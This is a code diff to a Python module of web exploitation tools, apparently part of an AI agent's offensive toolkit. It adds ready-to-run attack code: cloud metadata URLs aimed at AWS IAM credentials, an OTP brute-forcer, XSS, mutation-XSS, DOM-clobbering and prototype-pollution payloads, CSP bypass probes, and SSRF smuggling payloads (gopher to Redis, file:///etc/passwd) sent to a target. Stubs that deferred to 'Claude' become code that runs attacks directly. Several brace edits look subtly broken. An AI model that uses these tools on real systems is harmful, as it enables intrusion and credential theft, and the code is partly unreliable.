@@ -1,6 +1,17 @@
 """HTTP / web exploitation tools."""
 from __future__ import annotations
-import re, json, socket, threading, time
+import re, json, socket, threading, time, os, importlib
+from collections import Counter
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tools.shell import _shell, _w2l, IS_WINDOWS, USE_WSL, tool_execute_python, log
+
+
+CLOUD_PAYLOADS = {
+    "aws_v1": "http://169.254.169.254/latest/meta-data/",
+    "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "gcp_v1": "http://metadata.google.internal/computeMetadata/v1/",
+    "azure_v1": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+}
 
 
 def tool_http_request(url, method="GET", headers=None, data=None, json_data=None,
@@ -399,10 +410,10 @@ while queue and len(visited) < max_pages:
                               "inputs": inputs, "found_on": url}})
         # Check for interesting patterns
         for pat in find_pats:
-            hits = re.findall(rf'.{{0,50}}{pat}.{{0,50}}', body, re.IGNORECASE)
+            hits = re.findall(rf'.{{0,50}}{{pat}}.{{0,50}}', body, re.IGNORECASE)
             if hits:
                 for hit in hits[:3]:
-                    findings.append(f"[{pat.upper()}] {{url}}: {{hit.strip()}}")
+                    findings.append(f"[{{pat.upper()}}] {{url}}: {{hit.strip()}}")
     except Exception as e:
         pass
 
@@ -691,7 +702,7 @@ cks = {repr(cookies or {{}})}
 tlen = {token_length}
 session = requests.Session()
 
-print(f"Brute-forcing {{tlen}}-digit OTP (0-{'9'*tlen})...")
+print(f"Brute-forcing {{tlen}}-digit OTP (0-{{'9'*tlen}})...")
 start = time.time()
 for i in range(10**tlen):
     otp = str(i).zfill(tlen)
@@ -704,7 +715,7 @@ for i in range(10**tlen):
             print(f"[POSSIBLE HIT] OTP={{otp}} status={{r.status_code}} len={{len(r.text)}}")
         if i % 100 == 0:
             rate = i / (time.time()-start+0.001)
-            print(f"Progress: {{i}}/{{10**tlen}} ({rate:.0f}/s)")
+            print(f"Progress: {{i}}/{{10**tlen}} ({{rate:.0f}}/s)")
         if r.status_code == 429:
             print(f"Rate limited at {{i}}"); time.sleep(2)
     except Exception as ex:
@@ -836,7 +847,27 @@ for p in prefixes:
         return tool_execute_python(code, timeout=40)
 
     if operation == "preflight":
-        return f"[preflight] Claude handles this directly — use execute_python/execute_shell to run the technique"
+        code = f"""
+import requests
+requests.packages.urllib3.disable_warnings()
+target = {repr(target_url)}
+print('CORS preflight probe for', target)
+headers = {{
+  'Origin': 'https://evil.example',
+  'Access-Control-Request-Method': 'POST',
+  'Access-Control-Request-Headers': 'content-type,authorization'
+}}
+try:
+    r = requests.options(target, headers=headers, timeout=12, verify=False)
+    print('status:', r.status_code)
+    print('ACAO:', r.headers.get('Access-Control-Allow-Origin'))
+    print('ACAC:', r.headers.get('Access-Control-Allow-Credentials'))
+    print('ACAH:', r.headers.get('Access-Control-Allow-Headers'))
+    print('ACAM:', r.headers.get('Access-Control-Allow-Methods'))
+except Exception as e:
+    print('preflight error:', e)
+"""
+        return tool_execute_python(code, timeout=20)
 
     return "Operations: probe, exploit, subdomain_check, preflight"
 
@@ -1027,7 +1058,7 @@ danger_patterns = [
     (r'postMessage.*function', 'postMessage handler'),
 ]
 for pattern, label in danger_patterns:
-    matches = re.findall(f'.{{0,40}}{pattern}.{{0,40}}', src, re.IGNORECASE)
+    matches = re.findall(f'.{{0,40}}{{pattern}}.{{0,40}}', src, re.IGNORECASE)
     if matches:
         print(f"  {{label}}: {{len(matches)}} occurrence(s)")
         for m in matches[:2]: print(f"    {{m.strip()[:100]}}")
@@ -1035,12 +1066,27 @@ for pattern, label in danger_patterns:
         return tool_execute_python(code, timeout=30)
 
     if operation == "payloads":
+        dom_sinks = {
+            "innerHTML": [
+                "<img src=x onerror=alert(1)>",
+                "<svg/onload=alert(1)>",
+                "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+            ],
+            "document.write": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+            ],
+        }
+        sources = [
+            "location.hash", "location.search", "location.href", "document.referrer",
+            "window.name", "postMessage", "localStorage", "sessionStorage",
+        ]
         target_sink = sink or "innerHTML"
-        payloads = DOM_SINKS.get(target_sink, DOM_SINKS["innerHTML"])
+        payloads = dom_sinks.get(target_sink, dom_sinks["innerHTML"])
         lines = [f"=== DOM XSS payloads for sink: {target_sink} ===\n"]
         for p in payloads:
             lines.append(f"  {p}")
-        lines.append(f"\nTrigger sources to test: {', '.join(SOURCES[:5])}")
+        lines.append(f"\nTrigger sources to test: {', '.join(sources[:5])}")
         lines.append("\nEncoded variants (filter bypass):")
         lines.append("  <img src=x onerror=\\u0061lert(1)>  (unicode escape)")
         lines.append("  <img src=x onerror=eval(atob('YWxlcnQoMSk='))>  (base64)")
@@ -1055,16 +1101,80 @@ for pattern, label in danger_patterns:
         return "\n".join(lines)
 
     if operation == "dom_clobbering":
-        return f"[dom_clobbering] Claude handles this directly — use execute_python/execute_shell to run the technique"
+        code = f"""
+import requests, urllib.parse
+requests.packages.urllib3.disable_warnings()
+target = {repr(url_or_path)}
+payloads = [
+    '<form id=login><input name=action value=https://attacker.tld></form>',
+    '<a id=redirect href=javascript:alert(1)>x</a>',
+    '<iframe name=onload srcdoc="<svg onload=alert(1)>"></iframe>',
+    '<input id=innerHTML value="<img src=x onerror=alert(1)>">',
+]
+print('DOM clobbering payloads:')
+for p in payloads:
+    print('-', p)
+if target.startswith('http'):
+    q = urllib.parse.quote(payloads[0], safe='')
+    sep = '&' if '?' in target else '?'
+    test_url = f"{{target}}{{sep}}q={{q}}"
+    try:
+        r = requests.get(test_url, timeout=12, verify=False)
+        print(f"\\nProbe URL: {{test_url}}")
+        print(f"HTTP {{r.status_code}} len={{len(r.text)}}")
+    except Exception as e:
+        print(f"Probe request failed: {{e}}")
+"""
+        return tool_execute_python(code, timeout=25)
 
     if operation == "mutation_xss":
-        return f"[mutation_xss] Claude handles this directly — use execute_python/execute_shell to run the technique"
+        return "\n".join([
+            "mXSS executable test plan:",
+            "1) Inject parser-confusion payloads into same sink and re-read DOM via browser_agent.",
+            "2) Payload set:",
+            "   - <math><mtext></style><img src=x onerror=alert(1)>",
+            "   - <svg><p><style><img src=x onerror=alert(1)>",
+            "   - <noscript><p title=</noscript><img src=x onerror=alert(1)>",
+            "3) Use browser_agent with page.content() after render to detect DOM mutation to executable HTML.",
+        ])
 
     if operation == "csp_bypass":
-        return f"[csp_bypass] Claude handles this directly — use execute_python/execute_shell to run the technique"
+        code = f"""
+import requests, re
+requests.packages.urllib3.disable_warnings()
+target = {repr(url_or_path)}
+if not target.startswith('http'):
+    print('Provide URL for CSP probing')
+    raise SystemExit(0)
+r = requests.get(target, timeout=12, verify=False)
+csp = r.headers.get('Content-Security-Policy','')
+print('CSP:', csp or '<none>')
+if not csp:
+    print('No CSP present — direct DOM payloads likely viable.')
+else:
+    probes = [
+        ('unsafe-inline', 'inline handlers may execute'),
+        ('strict-dynamic', 'nonce/hash required'),
+        ('data:', 'data URI candidate'),
+        ('blob:', 'blob URI candidate'),
+        ('*.googleapis.com', 'JSONP endpoint candidate'),
+    ]
+    for key, note in probes:
+        if key in csp:
+            print(f'- {{key}}: {{note}}')
+print('Try: JSONP endpoint abuse, dangling markup, base-uri pivot, postMessage gadget chain.')
+"""
+        return tool_execute_python(code, timeout=20)
 
     if operation == "prototype_pollution_xss":
-        return f"[prototype_pollution_xss] Claude handles this directly — use execute_python/execute_shell to run the technique"
+        return "\n".join([
+            "Prototype-pollution executable payload pack:",
+            "- Querystring: ?__proto__[srcdoc]=<svg onload=alert(1)>",
+            "- JSON body: {\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
+            "- Constructor path: constructor[prototype][polluted]=1",
+            "Verification:",
+            "- Use browser_agent script: console.log(({}).polluted); console.log(({}).innerHTML)",
+        ])
 
     return "Operations: analyze, payloads, dom_clobbering, mutation_xss, csp_bypass, prototype_pollution_xss"
 
@@ -1211,7 +1321,32 @@ if not open_ports: print("No open ports found with SSRF probe")
                 f"Elasticsearch: http://127.0.0.1:9200/_cat/indices")
 
     if operation == "protocol_smuggle":
-        return f"[protocol_smuggle] Claude handles this directly — use execute_python/execute_shell to run the technique"
+        code = f"""
+import requests, urllib.parse
+requests.packages.urllib3.disable_warnings()
+target = {repr(target_url)}
+param = {repr(param)}
+method = {repr(method.upper())}
+headers = {json.dumps(headers or {})}
+cookies = {json.dumps(cookies or {})}
+payloads = [
+    ('gopher_redis_info', 'gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0ainfo%0d%0a'),
+    ('dict_redis', 'dict://127.0.0.1:6379/info'),
+    ('file_passwd', 'file:///etc/passwd'),
+    ('http_local_admin', 'http://127.0.0.1:8080/admin'),
+]
+for label, pl in payloads:
+    try:
+        if method == 'GET':
+            r = requests.get(target, params={param: pl}, headers=headers, cookies=cookies, timeout=12, verify=False)
+        else:
+            r = requests.post(target, data={param: pl}, headers=headers, cookies=cookies, timeout=12, verify=False)
+        snippet = (r.text or '')[:180].replace('\n',' ')
+        print(f"[{{label}}] status={{r.status_code}} len={{len(r.text)}} body={{snippet}}")
+    except Exception as e:
+        print(f"[{{label}}] error={{e}}")
+"""
+        return tool_execute_python(code, timeout=35)
 
     return "Operations: probe, cloud_metadata, port_scan, redis_rce, protocol_smuggle"
 
@@ -1470,7 +1605,7 @@ def tool_swagger_fuzz(target_url: str, operation: str = "discover",
                     break
                 except:
                     try:
-                        import yaml
+                        yaml = importlib.import_module("yaml")
                         spec = yaml.safe_load(r.text)
                         break
                     except: pass
@@ -1871,7 +2006,7 @@ p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).
 msg = f'{{h}}.{{p}}'.encode()
 sig = hmac.new(secret, msg, hashlib.sha256).digest()
 sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
-print(f'kid injection ({repr(kid_val)}): {{h}}.{{p}}.{{sig_b64}}')
+print(f'kid injection ({{repr(kid_val)}}): {{h}}.{{p}}.{{sig_b64}}')
 """
         return tool_execute_python(code, timeout=5)
 
